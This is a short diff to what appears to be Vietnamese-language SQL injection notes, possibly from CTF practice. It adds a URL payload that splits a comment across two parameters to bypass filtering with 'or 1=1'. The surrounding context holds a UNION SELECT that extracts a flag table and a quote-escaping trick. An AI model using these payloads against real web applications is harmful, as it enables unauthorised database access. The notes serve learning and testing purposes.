@@ -11,6 +11,11 @@ UNION SELECT flag_3e53dc FROM flag_304ad593-- -
 ```
 Đoạn `\'and password=` sẽ đc coi là tên username vì \' đã vô hiệu hóa dấu '
 
+```url
+?amount=-1/*&name=*/ or 1=1-- -
+```
+=> Dạng dùng comment lọc tham số đầu vào kết hợp 2 query
+
 ## Bypass space 
 
 ```sql
